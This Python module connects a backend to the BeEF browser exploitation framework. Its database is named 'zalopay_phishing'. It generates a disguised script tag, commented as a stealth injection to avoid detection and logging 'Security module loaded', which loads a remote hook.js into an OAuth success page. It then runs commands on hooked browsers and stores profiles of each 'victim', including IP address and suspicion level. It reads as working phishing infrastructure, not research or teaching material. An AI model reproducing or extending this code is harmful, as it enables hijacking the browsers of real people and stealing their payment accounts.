"""
BeEF Framework Integration
Connects backend with BeEF framework for browser exploitation
"""

import asyncio
import logging
import json
from datetime import datetime, timezone
from typing import Dict, List, Optional, Any
import httpx
from pymongo import MongoClient

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class BeEFIntegrationManager:
    """BeEF Framework integration manager"""
    
    def __init__(self, beef_url: str, api_token: str, mongodb_client: MongoClient):
        self.beef_url = beef_url.rstrip('/')
        self.api_token = api_token
        self.mongodb_client = mongodb_client
        self.db = mongodb_client.zalopay_phishing
        self.beef_sessions_collection = self.db.beef_sessions
        
        # HTTP client for BeEF API calls
        self.http_client = httpx.AsyncClient(
            timeout=30.0,
            headers={
                'Content-Type': 'application/json',
                'X-BeEF-Token': self.api_token
            }
        )
    
    async def test_connection(self) -> bool:
        """Test connection to BeEF framework"""
        try:
            response = await self.http_client.get(f"{self.beef_url}/api/hooks")
            if response.status_code == 200:
                logger.info("BeEF framework connection successful")
                return True
            else:
                logger.error(f"BeEF connection failed: {response.status_code}")
                return False
        except Exception as e:
            logger.error(f"BeEF connection error: {e}")
            return False
    
    async def get_hooked_browsers(self) -> List[Dict[str, Any]]:
        """Get list of hooked browsers from BeEF"""
        try:
            response = await self.http_client.get(f"{self.beef_url}/api/hooks")
            if response.status_code == 200:
                data = response.json()
                hooked_browsers = []
                
                for hook_data in data.get('hooked-browsers', []):
                    browser_info = {
                        'hook_id': hook_data.get('session'),
                        'ip_address': hook_data.get('ip'),
                        'user_agent': hook_data.get('name'),
                        'browser': hook_data.get('name'),
                        'os': hook_data.get('os'),
                        'last_seen': hook_data.get('lastseen'),
                        'page_url': hook_data.get('page_uri'),
                        'status': hook_data.get('status', 'unknown')
                    }
                    hooked_browsers.append(browser_info)
                
                return hooked_browsers
            else:
                logger.error(f"Failed to get hooked browsers: {response.status_code}")
                return []
                
        except Exception as e:
            logger.error(f"Error getting hooked browsers: {e}")
            return []
    
    async def execute_command(self, hook_id: str, command_module: str, parameters: Dict[str, Any] = None) -> Dict[str, Any]:
        """Execute a command on a hooked browser"""
        try:
            command_payload = {
                'command_module': command_module,
                'parameters': parameters or {}
            }
            
            response = await self.http_client.post(
                f"{self.beef_url}/api/hooks/{hook_id}/execute",
                json=command_payload
            )
            
            if response.status_code == 200:
                result = response.json()
                return {
                    'success': True,
                    'command_id': result.get('command_id'),
                    'result': result.get('result'),
                    'status': result.get('status')
                }
            else:
                return {
                    'success': False,
                    'error': f"Command execution failed: {response.status_code}",
                    'response': response.text
                }
                
        except Exception as e:
            logger.error(f"Error executing command: {e}")
            return {
                'success': False,
                'error': str(e)
            }
    
    async def get_command_modules(self) -> List[Dict[str, Any]]:
        """Get available command modules from BeEF"""
        try:
            response = await self.http_client.get(f"{self.beef_url}/api/modules")
            if response.status_code == 200:
                return response.json()
            else:
                logger.error(f"Failed to get command modules: {response.status_code}")
                return []
        except Exception as e:
            logger.error(f"Error getting command modules: {e}")
            return []
    
    async def create_beef_hook_script(self, victim_id: str) -> str:
        """Create BeEF hook script for injection"""
        hook_script = f"""
<script>
(function() {{
    // Stealth injection to avoid detection
    var s = document.createElement('script');
    s.src = '{self.beef_url}/hook.js';
    s.async = true;
    s.onload = function() {{
        console.log('Security module loaded');
    }};
    
    // Inject at various DOM states
    if (document.readyState === 'loading') {{
        document.head.appendChild(s);
    }} else {{
        setTimeout(() => document.head.appendChild(s), 1000);
    }}
}})();
</script>
"""
        return hook_script
    
    async def store_beef_session(self, victim_id: str, hook_id: str, browser_info: Dict[str, Any]) -> bool:
        """Store BeEF session information in database"""
        try:
            session_doc = {
                'beef_session_id': f"beef_{datetime.now().strftime('%Y%m%d_%H%M%S')}_{hook_id[:8]}",
                'hook_id': hook_id,
                'victim_id': victim_id,
                'injection_details': {
                    'injection_timestamp': datetime.now(timezone.utc),
                    'injection_method': 'oauth_success_page',
                    'injection_point': 'auth_success_page_load',
                    'hook_url': f"{self.beef_url}/hook.js",
                    'stealth_mode': True,
                    'obfuscated': True
                },
                'browser_profile': {
                    'browser_name': browser_info.get('browser', 'Unknown'),
                    'browser_version': 'Unknown',
                    'user_agent': browser_info.get('user_agent', ''),
                    'operating_system': browser_info.get('os', 'Unknown'),
                    'architecture': 'Unknown',
                    'platform': 'Unknown',
                    'screen_resolution': 'Unknown',
                    'color_depth': 24,
                    'timezone': 'Asia/Ho_Chi_Minh',
                    'language': 'vi-VN',
                    'java_enabled': False,
                    'cookies_enabled': True
                },
                'browser_capabilities': {
                    'local_storage': True,
                    'session_storage': True,
                    'indexed_db': True,
                    'web_sql': False,
                    'geolocation': True,
                    'notifications': False,
                    'camera_access': False,
                    'microphone_access': False,
                    'webrtc_supported': True,
                    'websocket_supported': True
                },
                'network_info': {
                    'public_ip': browser_info.get('ip_address', 'Unknown'),
                    'internal_ips': [browser_info.get('ip_address', 'Unknown')],
                    'connection_type': 'ethernet',
                    'proxy_detected': False,
                    'vpn_detected': False,
                    'isp': 'Unknown',
                    'asn': 'Unknown'
                },
                'session_status': {
                    'status': 'active',
                    'first_seen': datetime.now(timezone.utc),
                    'last_seen': datetime.now(timezone.utc),
                    'heartbeat_interval': 30,
                    'missed_heartbeats': 0,
                    'total_session_duration': 0,
                    'page_url': browser_info.get('page_url', '')
                },
                'commands_executed': [],
                'exploitation_phases': [],
                'intelligence_summary': {
                    'overall_success_rate': 0.0,
                    'high_value_intelligence': 0,
                    'medium_value_intelligence': 0,
                    'low_value_intelligence': 0,
                    'total_commands_executed': 0,
                    'successful_commands': 0,
                    'failed_commands': 0,
                    'victim_cooperation_level': 'unknown',
                    'security_awareness_level': 'unknown'
                },
                'risk_assessment': {
                    'detection_probability': 0.15,
                    'user_suspicion_level': 'low',
                    'technical_indicators': {
                        'antivirus_detected': False,
                        'browser_security_warnings': False,
                        'network_monitoring_detected': False
                    },
                    'behavioral_indicators': {
                        'unusual_user_behavior': False,
                        'multiple_failed_attempts': False,
                        'user_questioning_legitimacy': False
                    }
                },
                'created_at': datetime.now(timezone.utc),
                'updated_at': datetime.now(timezone.utc),
                'expires_at': datetime.now(timezone.utc).replace(hour=23, minute=59, second=59)  # TTL - 7 days
            }
            
            result = self.beef_sessions_collection.insert_one(session_doc)
            logger.info(f"Stored BeEF session for victim {victim_id} with ID: {result.inserted_id}")
            return True
            
        except Exception as e:
            logger.error(f"Error storing BeEF session: {e}")
            return False
    
    async def update_session_status(self, hook_id: str, status: str) -> bool:
        """Update BeEF session status"""
        try:
            result = self.beef_sessions_collection.update_one(
                {'hook_id': hook_id},
                {
                    '$set': {
                        'session_status.status': status,
                        'session_status.last_seen': datetime.now(timezone.utc),
                        'updated_at': datetime.now(timezone.utc)
                    }
                }
            )
            
            if result.modified_count > 0:
                logger.info(f"Updated BeEF session status for hook {hook_id}: {status}")
                return True
            else:
                logger.warning(f"No BeEF session found for hook {hook_id}")
                return False
                
        except Exception as e:
            logger.error(f"Error updating BeEF session status: {e}")
            return False
    
    async def add_command_result(self, hook_id: str, command_id: str, command_module: str, 
                                parameters: Dict[str, Any], result: Dict[str, Any]) -> bool:
        """Add command execution result to session"""
        try:
            command_doc = {
                'command_id': command_id,
                'module_name': command_module,
                'command_name': command_module,
                'executed_at': datetime.now(timezone.utc),
                'execution_time_ms': 0,  # Will be updated if available
                'success': result.get('success', False),
                'parameters': parameters,
                'result': result,
                'intelligence_value': 'low'  # Will be updated based on result
            }
            
            update_result = self.beef_sessions_collection.update_one(
                {'hook_id': hook_id},
                {
                    '$push': {'commands_executed': command_doc},
                    '$set': {'updated_at': datetime.now(timezone.utc)}
                }
            )
            
            if update_result.modified_count > 0:
                logger.info(f"Added command result for hook {hook_id}: {command_module}")
                return True
            else:
                logger.warning(f"No BeEF session found for hook {hook_id}")
                return False
                
        except Exception as e:
            logger.error(f"Error adding command result: {e}")
            return False
    
    async def get_victim_beef_sessions(self, victim_id: str) -> List[Dict[str, Any]]:
        """Get BeEF sessions for a specific victim"""
        try:
            sessions = list(self.beef_sessions_collection.find({'victim_id': victim_id}))
            return sessions
        except Exception as e:
            logger.error(f"Error getting victim BeEF sessions: {e}")
            return []
    
    async def cleanup_expired_sessions(self) -> int:
        """Clean up expired BeEF sessions"""
        try:
            result = self.beef_sessions_collection.delete_many({
                'expires_at': {'$lt': datetime.now(timezone.utc)}
            })
            
            logger.info(f"Cleaned up {result.deleted_count} expired BeEF sessions")
            return result.deleted_count
            
        except Exception as e:
            logger.error(f"Error cleaning up expired sessions: {e}")
            return 0
    
    async def get_beef_statistics(self) -> Dict[str, Any]:
        """Get BeEF framework statistics"""
        try:
            # Get hooked browsers from BeEF
            hooked_browsers = await self.get_hooked_browsers()
            
            # Get database statistics
            total_sessions = self.beef_sessions_collection.count_documents({})
            active_sessions = self.beef_sessions_collection.count_documents({
                'session_status.status': 'active'
            })
            
            # Get command execution statistics
            pipeline = [
                {'$unwind': '$commands_executed'},
                {'$group': {
                    '_id': None,
                    'total_commands': {'$sum': 1},
                    'successful_commands': {
                        '$sum': {'$cond': [{'$eq': ['$commands_executed.success', True]}, 1, 0]}
                    }
                }}
            ]
            
            command_stats = list(self.beef_sessions_collection.aggregate(pipeline))
            if command_stats:
                command_stats = command_stats[0]
            else:
                command_stats = {'total_commands': 0, 'successful_commands': 0}
            
            return {
                'hooked_browsers_count': len(hooked_browsers),
                'total_sessions': total_sessions,
                'active_sessions': active_sessions,
                'total_commands': command_stats['total_commands'],
                'successful_commands': command_stats['successful_commands'],
                'success_rate': (
                    command_stats['successful_commands'] / command_stats['total_commands']
                    if command_stats['total_commands'] > 0 else 0
                ),
                'hooked_browsers': hooked_browsers
            }
            
        except Exception as e:
            logger.error(f"Error getting BeEF statistics: {e}")
            return {}
    
    async def close(self):
        """Close HTTP client"""
        await self.http_client.aclose()

# Factory function to create BeEF integration manager
def create_beef_integration_manager(beef_url: str, api_token: str, mongodb_client: MongoClient) -> BeEFIntegrationManager:
    """Create BeEF integration manager instance"""
    return BeEFIntegrationManager(beef_url, api_token, mongodb_client)
